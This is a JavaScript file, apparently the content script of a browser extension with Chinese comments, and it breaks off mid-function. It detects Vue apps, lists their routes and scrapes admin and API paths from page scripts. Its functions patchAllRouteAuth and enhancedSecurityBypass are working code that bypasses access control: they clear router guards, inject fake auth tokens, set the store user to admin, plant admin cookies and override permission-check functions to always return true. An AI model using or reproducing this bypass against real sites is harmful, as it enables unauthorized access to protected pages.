(function() {
    // ======== 通用工具函数 ========

    // 广度优先查找 Vue 根实例（Vue2/3/Nuxt/Quasar）
    function findVueRoot(root, maxDepth = 1000) {
        const queue = [{ node: root, depth: 0 }];
        while (queue.length) {
            const { node, depth } = queue.shift();
            if (depth > maxDepth) break;

            // Vue 2/3 标准检测
            if (node.__vue_app__ || node.__vue__ || node._vnode) {
                return node;
            }

            // Vue 3 Composition API
            if (node.__vueParentComponent || node.__vueapp__) {
                return node;
            }

            // Nuxt.js 检测
            if (node.__NUXT__ || node.$nuxt) {
                return node;
            }

            // Quasar 检测
            if (node.__quasar__ || node.$q) {
                return node;
            }

            // Vue CLI / Vite 构建检测
            if (node._isVue || node.__VUE__) {
                return node;
            }

            if (node.nodeType === 1 && node.childNodes) {
                for (let i = 0; i < node.childNodes.length; i++) {
                    queue.push({ node: node.childNodes[i], depth: depth + 1 });
                }
            }
        }
        return null;
    }

    // 统一错误处理
    function handleError(error, context, shouldStop = false) {
        const errorMsg = `${context}: ${error.toString()}`;
        console.warn(errorMsg);

        if (shouldStop) {
            sendError(errorMsg);
            return false;
        }
        return true;
    }

    // 恢复控制台函数
    function restoreConsole(originals) {
        console.log = originals.log;
        console.warn = originals.warn;
        console.error = originals.error;
        console.table = originals.table;
    }

    // URL清理函数
    function cleanUrl(url) {
        return url.replace(/([^:]\/)\/+/g, '$1').replace(/\/$/, '');
    }

    // 获取Vue版本和框架信息
    function getVueVersion(vueRoot) {
        let version = vueRoot.__vue_app__?.version ||
            vueRoot.__vue__?.$root?.$options?._base?.version;

        let framework = 'Vue.js';
        let buildTool = '';

        if (!version || version === 'unknown') {
            // 尝试从全局Vue对象获取
            if (window.Vue && window.Vue.version) {
                version = window.Vue.version;
            }
            // 尝试从Vue DevTools获取
            else if (window.__VUE_DEVTOOLS_GLOBAL_HOOK__ &&
                window.__VUE_DEVTOOLS_GLOBAL_HOOK__.Vue) {
                version = window.__VUE_DEVTOOLS_GLOBAL_HOOK__.Vue.version;
            }
        }

        // 检测框架类型
        if (window.$nuxt || window.__NUXT__) {
            framework = 'Nuxt.js';
            if (window.$nuxt?.$root?.$nuxt?.constructor?.version) {
                version = window.$nuxt.$root.$nuxt.constructor.version;
            }
        } else if (window.Quasar || vueRoot.__quasar__) {
            framework = 'Quasar';
            if (window.Quasar?.version) {
                version = window.Quasar.version;
            }
        } else if (window.__VUE_HMR_RUNTIME__) {
            buildTool = 'Vite';
        } else if (window.webpackHotUpdate || window.__webpack_require__) {
            buildTool = 'Webpack';
        }

        return {
            version: version || 'unknown',
            framework: framework,
            buildTool: buildTool
        };
    }

    // ======== 消息发送函数 ========

    function sendResult(result) {
        window.postMessage({
            type: 'VUE_DETECTION_RESULT',
            result: result
        }, '*');
    }

    function sendRouterResult(result) {
        try {
            // 预处理 - 确保 allRoutes 是正确格式的数组
            if (result && result.allRoutes) {
                if (!Array.isArray(result.allRoutes)) {
                    // 如果不是数组，转换为数组
                    if (typeof result.allRoutes === 'object') {
                        const routeArray = [];
                        for (const key in result.allRoutes) {
                            if (result.allRoutes.hasOwnProperty(key)) {
                                const route = result.allRoutes[key];
                                if (route && typeof route === 'object') {
                                    routeArray.push({
                                        name: route.name || key,
                                        path: route.path || key,
                                        meta: route.meta || {}
                                    });
                                }
                            }
                        }
                        result.allRoutes = routeArray;
                    } else {
                        result.allRoutes = [];
                    }
                } else {
                    // 确保数组中的每个元素都有正确的结构
                    result.allRoutes = result.allRoutes.map(route => {
                        if (typeof route === 'object' && route !== null) {
                            return {
                                name: route.name || '',
                                path: route.path || '',
                                meta: route.meta || {}
                            };
                        }
                        return { name: '', path: route || '', meta: {} };
                    });
                }
            } else {
                result.allRoutes = [];
            }

            // 序列化清理结果数据
            const sanitizedResult = sanitizeForPostMessage(result);

            // 调试信息
            console.log('📤 发送路由分析结果到popup:', {
                pathDefinitionsCount: sanitizedResult.pathDefinitions?.paths?.length || 0,
                allRoutesCount: sanitizedResult.allRoutes?.length || 0,
                hasPathDefinitions: !!sanitizedResult.pathDefinitions
            });

            window.postMessage({
                type: 'VUE_ROUTER_ANALYSIS_RESULT',
                result: sanitizedResult
            }, '*');
        } catch (error) {
            console.warn('Failed to send router result:', error);
            // 发送最简化版本
            window.postMessage({
                type: 'VUE_ROUTER_ANALYSIS_RESULT',
                result: {
                    vueDetected: result?.vueDetected || false,
                    routerDetected: result?.routerDetected || false,
                    vueVersion: result?.vueVersion || 'Unknown',
                    modifiedRoutes: result?.modifiedRoutes || [],
                    error: 'Serialization failed',
                    allRoutes: []
                }
            }, '*');
        }
    }

    function sendError(error) {
        window.postMessage({
            type: 'VUE_ROUTER_ANALYSIS_ERROR',
            error: error
        }, '*');
    }

    // ======== Vue检测函数 ========

    function simpleVueDetection() {
        const vueRoot = findVueRoot(document.body);
        return vueRoot;
    }


    // ======== Vue Router相关函数 ========

    // 定位 Vue Router 实例
    function findVueRouter(vueRoot) {
        try {
            if (vueRoot.__vue_app__) {
                // Vue3 + Router4
                const app = vueRoot.__vue_app__;

                if (app.config?.globalProperties?.$router) {
                    return app.config.globalProperties.$router;
                }

                const instance = app._instance;
                if (instance?.appContext?.config?.globalProperties?.$router) {
                    return instance.appContext.config.globalProperties.$router;
                }

                if (instance?.ctx?.$router) {
                    return instance.ctx.$router;
                }
            }

            if (vueRoot.__vue__) {
                // Vue2 + Router2/3
                const vue = vueRoot.__vue__;
                return vue.$router ||
                    vue.$root?.$router ||
                    vue.$root?.$options?.router ||
                    vue._router;
            }
        } catch (e) {
            handleError(e, 'findVueRouter');
        }
        return null;
    }

    // 遍历路由数组及其子路由
    function walkRoutes(routes, cb) {
        if (!Array.isArray(routes)) return;
        routes.forEach(route => {
            cb(route);
            if (Array.isArray(route.children) && route.children.length) {
                walkRoutes(route.children, cb);
            }
        });
    }

    // 判断 meta 字段值是否表示"真"（需要鉴权）
    function isAuthTrue(val) {
        return val === true || val === 'true' || val === 1 || val === '1';
    }

    // 路径拼接函数
    function joinPath(base, path) {
        if (!path) return base || '/';
        if (path.startsWith('/')) return path;
        if (!base || base === '/') return '/' + path;
        return (base.endsWith('/') ? base.slice(0, -1) : base) + '/' + path;
    }

    // 提取Router基础路径
    function extractRouterBase(router) {
        try {
            if (router.options?.base) {
                return router.options.base;
            }
            if (router.history?.base) {
                return router.history.base;
            }
            return '';
        } catch (e) {
            handleError(e, '提取Router基础路径');
            return '';
        }
    }

    // 链接缓存
    const linkCache = new Map();

    // 获取缓存的链接
    function getCachedLinks() {
        const cacheKey = 'page-links';
        if (linkCache.has(cacheKey)) {
            return linkCache.get(cacheKey);
        }

        const links = Array.from(document.querySelectorAll('a[href]'))
            .map(a => a.getAttribute('href'))
            .filter(href =>
                href &&
                href.startsWith('/') &&
                !href.startsWith('//') &&
                !href.includes('.')
            );

        linkCache.set(cacheKey, links);
        return links;
    }

    // 分析页面中的链接
    function analyzePageLinks() {
        const result = {
            detectedBasePath: '',
            commonPrefixes: []
        };

        try {
            const links = getCachedLinks();

            if (links.length < 3) return result;

            const pathSegments = links.map(link => link.split('/').filter(Boolean));
            const firstSegments = {};

            pathSegments.forEach(segments => {
                if (segments.length > 0) {
                    const first = segments[0];
                    firstSegments[first] = (firstSegments[first] || 0) + 1;
                }
            });

            const sortedPrefixes = Object.entries(firstSegments)
                .sort((a, b) => b[1] - a[1])
                .map(entry => ({ prefix: entry[0], count: entry[1] }));

            result.commonPrefixes = sortedPrefixes;

            if (sortedPrefixes.length > 0 &&
                sortedPrefixes[0].count / links.length > 0.6) {
                result.detectedBasePath = '/' + sortedPrefixes[0].prefix;
            }
        } catch (e) {
            handleError(e, '分析页面链接');
        }

        return result;
    }

    // 修改路由 meta
    function patchAllRouteAuth(router) {
        const modified = [];

        function patchMeta(route) {
            if (route.meta && typeof route.meta === 'object') {
                Object.keys(route.meta).forEach(key => {
                    if (key.toLowerCase().includes('auth') && isAuthTrue(route.meta[key])) {
                        route.meta[key] = false;
                        modified.push({ path: route.path, name: route.name });
                    }
                });
            }
        }

        try {
            if (typeof router.getRoutes === 'function') {
                router.getRoutes().forEach(patchMeta);
            }
            else if (router.options?.routes) {
                walkRoutes(router.options.routes, patchMeta);
            }
            else if (router.matcher) {
                if (typeof router.matcher.getRoutes === 'function') {
                    router.matcher.getRoutes().forEach(patchMeta);
                }
                else if (router.matcher.match && router.history?.current?.matched) {
                    router.history.current.matched.forEach(patchMeta);
                }
            }
            else {
                console.warn('🚫 未识别的 Vue Router 版本，跳过 Route Auth Patch');
            }
        } catch (e) {
            handleError(e, 'patchAllRouteAuth');
        }

        if (modified.length) {
            console.log('🚀 已修改的路由 auth meta：');
            console.table(modified);
        } else {
            console.log('ℹ️ 没有需要修改的路由 auth 字段');
        }

        return modified;
    }

    // 增强安全绕过功能
    function enhancedSecurityBypass(router, vueRoot) {
        const bypassResults = {
            routerGuardsCleared: false,
            authFieldsModified: [],
            tokensBypass: false,
            permissionsBypass: false,
            sessionBypass: false,
            cookiesBypass: false
        };

        try {
            // 1. 清除路由守卫
            ['beforeEach', 'beforeResolve', 'afterEach'].forEach(hook => {
                if (typeof router[hook] === 'function') {
                    router[hook] = () => {};
                }
            });

            const guardProps = [
                'beforeGuards', 'beforeResolveGuards', 'afterGuards',
                'beforeHooks', 'resolveHooks', 'afterHooks'
            ];

            guardProps.forEach(prop => {
                if (Array.isArray(router[prop])) {
                    router[prop].length = 0;
                }
            });

            bypassResults.routerGuardsCleared = true;

            // 2. 尝试绕过常见的认证token检查
            const authTokens = ['token', 'accessToken', 'authToken', 'jwt', 'bearerToken'];
            authTokens.forEach(tokenName => {
                if (window.localStorage.getItem(tokenName) === null) {
                    window.localStorage.setItem(tokenName, 'bypassed_token_' + Date.now());
                    bypassResults.tokensBypass = true;
                }
                if (window.sessionStorage.getItem(tokenName) === null) {
                    window.sessionStorage.setItem(tokenName, 'bypassed_token_' + Date.now());
                    bypassResults.sessionBypass = true;
                }
            });

            // 3. 修改Vuex/Pinia中的用户状态
            if (vueRoot.__vue_app__) {
                const app = vueRoot.__vue_app__;
                const store = app.config?.globalProperties?.$store;
                if (store && store.state) {
                    if (store.state.user) {
                        if (store.state.user.isAuthenticated !== undefined) {
                            store.state.user.isAuthenticated = true;
                            bypassResults.permissionsBypass = true;
                        }
                        if (store.state.user.permissions !== undefined) {
                            store.state.user.permissions = ['admin', 'read', 'write', 'delete'];
                            bypassResults.permissionsBypass = true;
                        }
                        if (store.state.user.role !== undefined) {
                            store.state.user.role = 'admin';
                            bypassResults.permissionsBypass = true;
                        }
                    }
                    if (store.state.auth) {
                        if (store.state.auth.isLoggedIn !== undefined) {
                            store.state.auth.isLoggedIn = true;
                            bypassResults.permissionsBypass = true;
                        }
                        if (store.state.auth.user !== undefined) {
                            store.state.auth.user = { id: 1, role: 'admin', permissions: ['all'] };
                            bypassResults.permissionsBypass = true;
                        }
                    }
                }
            }

            // 4. 设置常见的认证Cookie
            const authCookies = [
                'authenticated=true',
                'user_role=admin',
                'session_valid=true',
                'is_logged_in=true',
                'admin_access=true'
            ];
            authCookies.forEach(cookie => {
                document.cookie = cookie + '; path=/';
                bypassResults.cookiesBypass = true;
            });

            // 5. 劫持常见的权限检查函数
            if (window.hasPermission) {
                window.hasPermission = () => true;
                bypassResults.permissionsBypass = true;
            }
            if (window.checkAuth) {
                window.checkAuth = () => true;
                bypassResults.permissionsBypass = true;
            }
            if (window.isAuthenticated) {
                window.isAuthenticated = () => true;
                bypassResults.permissionsBypass = true;
            }

            console.log('🔓 增强安全绕过已执行');
            console.log('🛡️ 绕过结果：', bypassResults);

        } catch (e) {
            handleError(e, 'enhancedSecurityBypass');
        }

        return bypassResults;
    }

    // 清除路由守卫（兼容旧版本）
    function patchRouterGuards(router) {
        try {
            ['beforeEach', 'beforeResolve', 'afterEach'].forEach(hook => {
                if (typeof router[hook] === 'function') {
                    router[hook] = () => {};
                }
            });

            const guardProps = [
                'beforeGuards', 'beforeResolveGuards', 'afterGuards',
                'beforeHooks', 'resolveHooks', 'afterHooks'
            ];

            guardProps.forEach(prop => {
                if (Array.isArray(router[prop])) {
                    router[prop].length = 0;
                }
            });

            console.log('✅ 路由守卫已清除');
        } catch (e) {
            handleError(e, 'patchRouterGuards');
        }
    }

    // 数据序列化过滤函数
    function sanitizeForPostMessage(obj) {
        if (obj === null || obj === undefined) {
            return obj;
        }

        if (typeof obj === 'function') {
            return '[Function]';
        }

        if (obj instanceof Promise) {
            return '[Promise]';
        }

        if (typeof obj === 'object') {
            if (obj.constructor && obj.constructor.name &&
                !['Object', 'Array'].includes(obj.constructor.name)) {
                return `[${obj.constructor.name}]`;
            }

            const sanitized = Array.isArray(obj) ? [] : {};

            try {
                for (const key in obj) {
                    if (obj.hasOwnProperty && obj.hasOwnProperty(key)) {
                        const value = obj[key];

                        // 特殊处理 allRoutes 数组
                        if (key === 'allRoutes' && Array.isArray(value)) {
                            sanitized[key] = value.map(route => {
                                if (typeof route === 'object' && route !== null) {
                                    return {
                                        name: route.name || '',
                                        path: route.path || '',
                                        meta: route.meta ? sanitizeRouteObject(route.meta) : {}
                                    };
                                }
                                return route;
                            });
                            continue;
                        }

                        // 特殊处理 pathDefinitions 对象
                        if (key === 'pathDefinitions' && typeof value === 'object' && value !== null) {
                            sanitized[key] = {
                                paths: Array.isArray(value.paths) ? value.paths.map(pathItem => {
                                    if (typeof pathItem === 'object' && pathItem !== null) {
                                        return {
                                            path: pathItem.path || '',
                                            source: pathItem.source || '',
                                            pattern: pathItem.pattern || ''
                                        };
                                    }
                                    return pathItem;
                                }) : []
                            };
                            continue;
                        }

                        // 跳过可能导致循环引用的属性
                        if (key.startsWith('_') || key.startsWith('$') ||
                            key === 'parent' || key === 'router' || key === 'matched') {
                            continue;
                        }

                        if (typeof value === 'function') {
                            sanitized[key] = '[Function]';
                        } else if (value instanceof Promise) {
                            sanitized[key] = '[Promise]';
                        } else if (Array.isArray(value)) {
                            // 处理数组 - 检查是否是路由数组
                            if (value.length > 0 && value[0] && typeof value[0] === 'object' && value[0].path !== undefined) {
                                // 这是路由数组
                                sanitized[key] = value.map(item => {
                                    if (typeof item === 'object' && item !== null) {
                                        return {
                                            name: item.name || '',
                                            path: item.path || '',
                                            meta: item.meta ? sanitizeRouteObject(item.meta) : {}
                                        };
                                    }
                                    return item;
                                });
                            } else {
                                // 普通数组
                                sanitized[key] = value.map(item => {
                                    if (typeof item === 'object' && item !== null) {
                                        return sanitizeRouteObject(item);
                                    }
                                    return item;
                                });
                            }
                        } else if (typeof value === 'object' && value !== null) {
                            // 简单对象递归处理，避免深度过大
                            if (key === 'meta' || key === 'query' || key === 'params') {
                                sanitized[key] = sanitizeRouteObject(value);
                            } else {
                                sanitized[key] = '[Object]';
                            }
                        } else {
                            sanitized[key] = value;
                        }
                    }
                }
            } catch (e) {
                return '[Object - Serialization Error]';
            }

            return sanitized;
        }

        return obj;
    }

    // 专门处理路由对象的函数
    function sanitizeRouteObject(obj) {
        if (!obj || typeof obj !== 'object') {
            return obj;
        }

        const sanitized = {};

        try {
            for (const key in obj) {
                if (obj.hasOwnProperty && obj.hasOwnProperty(key)) {
                    const value = obj[key];

                    if (typeof value === 'function') {
                        sanitized[key] = '[Function]';
                    } else if (value instanceof Promise) {
                        sanitized[key] = '[Promise]';
                    } else if (typeof value === 'object' && value !== null) {
                        // 避免深度递归
                        sanitized[key] = '[Object]';
                    } else {
                        sanitized[key] = value;
                    }
                }
            }
        } catch (e) {
            return '[Route Object - Serialization Error]';
        }

        return sanitized;
    }

    // 分析路由参数和动态路由
    function analyzeRouteParameters(path) {
        const analysis = {
            hasParams: false,
            hasQuery: false,
            hasWildcard: false,
            parameters: [],
            examples: []
        };

        // 检测路径参数 :id, :name 等
        const paramMatches = path.match(/:(\w+)/g);
        if (paramMatches) {
            analysis.hasParams = true;
            analysis.parameters = paramMatches.map(p => p.substring(1));
            
            // 生成示例路径
            let examplePath = path;
            paramMatches.forEach((param, index) => {
                const paramName = param.substring(1);
                const exampleValue = paramName === 'id' ? '123' : 
                                   paramName === 'userId' ? '456' : 
                                   paramName === 'name' ? 'example' : 'value';
                examplePath = examplePath.replace(param, exampleValue);
            });
            analysis.examples.push(examplePath);
        }

        // 检测通配符路由
        if (path.includes('*') || path.includes('(.*)')) {
            analysis.hasWildcard = true;
            analysis.examples.push(path.replace('*', 'any-path'));
        }

        // 检测可选参数
        if (path.includes('?')) {
            analysis.hasQuery = true;
        }

        return analysis;
    }

    // 列出所有路由（增强版）
    function listAllRoutes(router) {
        const list = [];

        try {
            // Vue Router 4
            if (typeof router.getRoutes === 'function') {
                router.getRoutes().forEach(r => {
                    const routeInfo = {
                        name: r.name,
                        path: r.path,
                        meta: r.meta,
                        component: r.component?.name || r.component?.constructor?.name || 'Unknown',
                        analysis: analyzeRouteParameters(r.path)
                    };
                    
                    // 提取路由守卫信息
                    if (r.beforeEnter) routeInfo.hasBeforeEnter = true;
                    if (r.meta?.requiresAuth) routeInfo.requiresAuth = true;
                    if (r.meta?.roles) routeInfo.roles = r.meta.roles;
                    
                    list.push(routeInfo);
                });
                return list;
            }

            // Vue Router 2/3
            if (router.options?.routes) {
                function traverse(routes, basePath = '') {
                    routes.forEach(r => {
                        const fullPath = joinPath(basePath, r.path);
                        const routeInfo = {
                            name: r.name,
                            path: fullPath,
                            meta: r.meta,
                            component: r.component?.name || r.component?.constructor?.name || 'Unknown',
                            analysis: analyzeRouteParameters(fullPath)
                        };
                        
                        // 提取路由守卫信息
                        if (r.beforeEnter) routeInfo.hasBeforeEnter = true;
                        if (r.meta?.requiresAuth) routeInfo.requiresAuth = true;
                        if (r.meta?.roles) routeInfo.roles = r.meta.roles;
                        
                        list.push(routeInfo);
                        
                        if (Array.isArray(r.children) && r.children.length) {
                            traverse(r.children, fullPath);
                        }
                    });
                }
                traverse(router.options.routes);
                return list;
            }

            // 从matcher获取
            if (router.matcher?.getRoutes) {
                const routes = router.matcher.getRoutes();
                routes.forEach(r => {
                    const routeInfo = {
                        name: r.name,
                        path: r.path,
                        meta: r.meta,
                        component: 'Unknown',
                        analysis: analyzeRouteParameters(r.path)
                    };
                    list.push(routeInfo);
                });
                return list;
            }

            // 从历史记录获取
            if (router.history?.current?.matched) {
                router.history.current.matched.forEach(r => {
                    const routeInfo = {
                        name: r.name,
                        path: r.path,
                        meta: r.meta,
                        component: 'Unknown',
                        analysis: analyzeRouteParameters(r.path)
                    };
                    list.push(routeInfo);
                });
                return list;
            }

            console.warn('🚫 无法列出路由信息');
        } catch (e) {
            handleError(e, 'listAllRoutes');
        }

        return list;
    }

    // ======== Path路径发现函数 ========

    // 从内容中提取路径的通用函数
    function extractPathsFromContent(content, source, pathInfo) {
        if (!content) return;
        
        const pathPatterns = [
            /path\s*:\s*["']([^"']+)["']/gi,              // path: "/xxx"
            /["']path["']\s*:\s*["']([^"']+)["']/gi,      // "path": "/xxx"
            /path\s*=\s*["']([^"']+)["']/gi,              // path = "/xxx"
            /route\s*:\s*["']([^"']+)["']/gi,             // route: "/xxx"
            /url\s*:\s*["']([^"']+)["']/gi,               // url: "/xxx"
        ];

        let foundCount = 0;
        pathPatterns.forEach((pattern, index) => {
            let match;
            pattern.lastIndex = 0;
            
            while ((match = pattern.exec(content)) !== null) {
                const path = match[1];
                
                if (path && 
                    path.startsWith('/') && 
                    path.length > 1 && 
                    path.length < 200 &&
                    !path.includes('<') && 
                    !path.includes('>') && 
                    !path.includes('script') && 
                    !path.includes('style') &&
                    !path.includes('http') &&
                    !/\.(js|css|png|jpg|gif|svg|ico|woff|ttf)$/i.test(path)) {
                    
                    pathInfo.paths.push({
                        path: path,
                        source: source,
                        pattern: `模式${index + 1}`
                    });
                    foundCount++;
                }
                
                if (foundCount > 100) break; // 防止过多匹配
            }
        });
        
        if (foundCount > 0) {
            console.log(`   ✅ ${source} 中发现 ${foundCount} 个路径`);
        }
    }

    // 检查webpack模块系统
    async function checkWebpackModules(pathInfo) {
        try {
            console.log('🔍 检查webpack模块系统...');
            
            // 检查webpack chunk信息
            if (window.webpackJsonp) {
                console.log('   📦 发现webpackJsonp');
                const chunks = window.webpackJsonp;
                if (Array.isArray(chunks)) {
                    chunks.forEach((chunk, index) => {
                        if (chunk && chunk[1]) {
                            const moduleStr = JSON.stringify(chunk[1]);
                            extractPathsFromContent(moduleStr, `Webpack Chunk ${index}`, pathInfo);
                        }
                    });
                }
            }

            // 检查webpack require函数
            if (window.__webpack_require__) {
                console.log('   🔧 发现__webpack_require__');
                try {
                    // 尝试获取webpack模块缓存
                    const cache = window.__webpack_require__.cache;
                    if (cache) {
                        let moduleCount = 0;
                        for (let moduleId in cache) {
                            const module = cache[moduleId];
                            if (module && module.exports) {
                                const moduleStr = JSON.stringify(module.exports);
                                if (moduleStr.includes('path') && moduleStr.includes('/')) {
                                    extractPathsFromContent(moduleStr, `Webpack模块 ${moduleId}`, pathInfo);
                                    moduleCount++;
                                }
                            }
                            if (moduleCount > 50) break; // 限制检查数量
                        }
                        console.log(`   ✅ 检查了 ${moduleCount} 个webpack模块`);
                    }
                } catch (e) {
                    console.warn('   ⚠️ 无法访问webpack缓存:', e.message);
                }
            }

            // 检查现代webpack (webpack 5)
            if (window.__webpack_modules__) {
                console.log('   📦 发现__webpack_modules__ (webpack 5)');
                try {
                    const modules = window.__webpack_modules__;
                    let count = 0;
                    for (let moduleId in modules) {
                        if (typeof modules[moduleId] === 'function') {
                            const moduleStr = modules[moduleId].toString();
                            if (moduleStr.includes('path') && moduleStr.includes('/')) {
                                extractPathsFromContent(moduleStr, `Webpack5模块 ${moduleId}`, pathInfo);
                                count++;
                            }
                        }
                        if (count > 50) break;
                    }
                    console.log(`   ✅ 检查了 ${count} 个webpack 5模块`);
                } catch (e) {
                    console.warn('   ⚠️ 无法访问webpack 5模块:', e.message);
                }
            }
            
        } catch (e) {
            console.warn('检查webpack模块失败:', e);
        }
    }

    // 检查AMD/CommonJS模块系统
    function checkModuleSystems(pathInfo) {
        try {
            console.log('🔍 检查模块系统...');
            
            // 检查RequireJS
            if (window.requirejs || window.require) {
                console.log('   📚 发现RequireJS');
                if (window.require && window.require.s && window.require.s.contexts) {
                    const contexts = window.require.s.contexts;
                    for (let contextName in contexts) {
                        const context = contexts[contextName];
                        if (context.defined) {
                            for (let moduleName in context.defined) {
                                const moduleContent = JSON.stringify(context.defined[moduleName]);
                                if (moduleContent.includes('path') && moduleContent.includes('/')) {
                                    extractPathsFromContent(moduleContent, `RequireJS模块 ${moduleName}`, pathInfo);
                                }
                            }
                        }
                    }
                }
            }

            // 检查SystemJS
            if (window.System) {
                console.log('   🔄 发现SystemJS');
                // SystemJS模块检查逻辑
            }

        } catch (e) {
            console.warn('检查模块系统失败:', e);
        }
    }

    // 检查Vue相关的全局对象
    function checkVueGlobalObjects(pathInfo) {
        try {
            console.log('🔍 检查Vue全局对象...');
            
            // 检查Vue Router
            if (window.$router) {
                console.log('   🛣️ 发现$router');
                const routerStr = JSON.stringify(window.$router);
                extractPathsFromContent(routerStr, 'Vue Router', pathInfo);
            }

            // 检查Vue实例
            if (window.__VUE__) {
                console.log('   🎯 发现__VUE__');
                const vueStr = JSON.stringify(window.__VUE__);
                extractPathsFromContent(vueStr, 'Vue实例', pathInfo);
            }

            // 检查所有可能包含路由信息的全局变量
            const potentialVueVars = ['$vue', '$app', 'app', 'router', 'routes', 'config'];
            potentialVueVars.forEach(varName => {
                if (window[varName] && typeof window[varName] === 'object') {
                    try {
                        const objStr = JSON.stringify(window[varName]);
                        if (objStr.includes('path') && objStr.includes('/')) {
                            extractPathsFromContent(objStr, `全局变量 ${varName}`, pathInfo);
                        }
                    } catch (e) {
                        // 忽略循环引用等错误
                    }
                }
            });

        } catch (e) {
            console.warn('检查Vue全局对象失败:', e);
        }
    }

    // 尝试从浏览器缓存中获取JS内容
    async function tryExtractFromCache(pathInfo) {
        try {
            console.log('🔍 尝试从缓存中获取JS内容...');
            
            // 使用fetch API尝试获取已加载的JS文件
            const scripts = Array.from(document.scripts);
            const externalScripts = scripts.filter(script => script.src && !script.src.includes('extension'));
            
            console.log(`   📄 发现 ${externalScripts.length} 个外部脚本`);
            
            for (let i = 0; i < Math.min(externalScripts.length, 10); i++) {
                const script = externalScripts[i];
                try {
                    // 尝试从同源脚本获取内容
                    if (script.src.startsWith(window.location.origin)) {
                        const response = await fetch(script.src);
                        if (response.ok) {
                            const content = await response.text();
                            console.log(`   ✅ 成功获取脚本内容: ${script.src.split('/').pop()}, 长度: ${content.length}`);
                            extractPathsFromContent(content, `外部脚本 ${script.src.split('/').pop()}`, pathInfo);
                        }
                    }
                } catch (e) {
                    // 跨域或其他错误，忽略
                    console.log(`   ⚠️ 无法获取脚本: ${script.src.split('/').pop()}`);
                }
            }
            
        } catch (e) {
            console.warn('从缓存获取JS内容失败:', e);
        }
    }

    // 发现Path路径定义
    async function discoverPathDefinitions() {
        const pathInfo = {
            paths: []
        };

        try {
            console.log('🔍 开始深度搜索Path路径定义...');

            // 1. 获取所有已加载的脚本资源
            const allScripts = Array.from(document.scripts);
            console.log(`📄 发现 ${allScripts.length} 个脚本标签`);

            // 2. 扫描内联脚本内容
            let inlineScriptCount = 0;
            allScripts.forEach((script, index) => {
                if (script.textContent && script.textContent.trim()) {
                    inlineScriptCount++;
                    console.log(`📝 扫描内联脚本 ${inlineScriptCount}，长度: ${script.textContent.length}`);
                    extractPathsFromContent(script.textContent, `内联脚本${inlineScriptCount}`, pathInfo);
                }
            });

            // 3. 尝试从Performance API获取已加载的资源
            try {
                if (window.performance && window.performance.getEntriesByType) {
                    const resources = window.performance.getEntriesByType('resource');
                    const jsResources = resources.filter(r => r.name.includes('.js') && !r.name.includes('extension'));
                    console.log(`🌐 发现 ${jsResources.length} 个JS资源文件`);
                    
                    jsResources.forEach((resource, index) => {
                        console.log(`   ${index + 1}. ${resource.name}`);
                    });
                }
            } catch (e) {
                console.warn('无法获取Performance API资源:', e);
            }

            // 4. 扫描整个页面HTML（包括嵌入的webpack代码）
            const fullHTML = document.documentElement.outerHTML;
            console.log(`📄 扫描完整页面HTML，长度: ${fullHTML.length}`);
            extractPathsFromContent(fullHTML, 'HTML页面', pathInfo);

            // 5. 检查webpack模块系统
            await checkWebpackModules(pathInfo);

            // 6. 检查AMD/CommonJS模块
            checkModuleSystems(pathInfo);

            // 7. 检查Vue相关的全局对象
            checkVueGlobalObjects(pathInfo);

            // 8. 尝试从浏览器缓存中获取JS内容
            await tryExtractFromCache(pathInfo);

            // 9. 去重处理
            const uniquePaths = new Map();
            pathInfo.paths.forEach(item => {
                if (!uniquePaths.has(item.path)) {
                    uniquePaths.set(item.path, item);
                }
            });
            
            pathInfo.paths = Array.from(uniquePaths.values());

            // 10. 智能过滤
            pathInfo.paths = pathInfo.paths.filter(item => {
                const path = item.path;
                return (
                    path.includes('/') && 
                    path.length >= 2 && 
                    path.length <= 100 && 
                    !path.includes('favicon') &&
                    !path.includes('static/css') &&
                    !path.includes('static/js') &&
                    !path.includes('assets/') &&
                    !path.includes('chunk-') &&
                    !path.includes('.min.') &&
                    !path.includes('node_modules') &&
                    (/^\/[a-zA-Z0-9][a-zA-Z0-9-_/.]*$/.test(path) || 
                     path.includes('/api') || 
                     path.includes('/admin') || 
                     path.includes('/user') || 
                     path.includes('/system') || 
                     path.includes('/monitor') || 
                     path.includes('/manage') || 
                     path.includes('/dashboard') ||
                     path.includes('/login') ||
                     path.includes('/logout') ||
                     path.includes('/home') ||
                     path.includes('/index') ||
                     path.includes('/main') ||
                     path.includes('/page') ||
                     path.includes('/view') ||
                     path.includes('/component') ||
                     path.includes('/module') ||
                     path.includes('/config') ||
                     path.includes('/setting') ||
                     path.includes('/profile') ||
                     path.includes('/account'))
                );
            });

            console.log(`✅ 经过过滤后发现 ${pathInfo.paths.length} 个有效Path路径定义`);
            if (pathInfo.paths.length > 0) {
                console.table(pathInfo.paths);
            } else {
                console.warn('⚠️ 未找到有效的path路径定义');
                
                // 调试信息
                const fullHTML = document.documentElement.outerHTML;
                const pathKeywordCount = (fullHTML.match(/path/gi) || []).length;
                console.log(`🔍 页面中包含 "path" 关键字: ${pathKeywordCount} 次`);
                
                // 显示一些可能的路径样本
                const potentialPaths = fullHTML.match(/["'][\/][^"']{1,100}["']/gi) || [];
                if (potentialPaths.length > 0) {
                    console.log('🔍 发现的可能路径样本 (前20个):', potentialPaths.slice(0, 20));
                }

                // 专门查找 path: 格式的定义
                const pathDefinitions = fullHTML.match(/path\s*:\s*["'][^"']+["']/gi) || [];
                if (pathDefinitions.length > 0) {
                    console.log('🎯 发现path:定义样本 (前10个):', pathDefinitions.slice(0, 10));
                    
                    // 尝试从这些定义中提取路径
                    console.log('🔧 尝试手动提取路径...');
                    pathDefinitions.slice(0, 10).forEach((def, index) => {
                        const match = def.match(/path\s*:\s*["']([^"']+)["']/i);
                        if (match && match[1]) {
                            console.log(`   ${index + 1}. ${match[1]} (来源: ${def.substring(0, 50)}...)`);
                            // 如果是有效路径，直接添加到结果中
                            if (match[1].startsWith('/') && match[1].length > 1) {
                                pathInfo.paths.push({
                                    path: match[1],
                                    source: '手动提取'
                                });
                            }
                        }
                    });
                }
            }

        } catch (e) {
            handleError(e, 'discoverPathDefinitions');
        }

        return pathInfo;
    }

    // ======== 完整分析函数 ========

    async function performFullAnalysis() {
        const result = {
            vueDetected: false,
            vueVersion: null,
            framework: 'Vue.js',
            buildTool: '',
            routerDetected: false,
            logs: [],
            modifiedRoutes: [],
            allRoutes: [],
            routerBase: '',
            pageAnalysis: {
                detectedBasePath: '',
                commonPrefixes: []
            },
            currentPath: window.location.pathname,
            pathDefinitions: null,
            securityBypass: null
        };

        // 保存原始控制台函数
        const originals = {
            log: console.log,
            warn: console.warn,
            error: console.error,
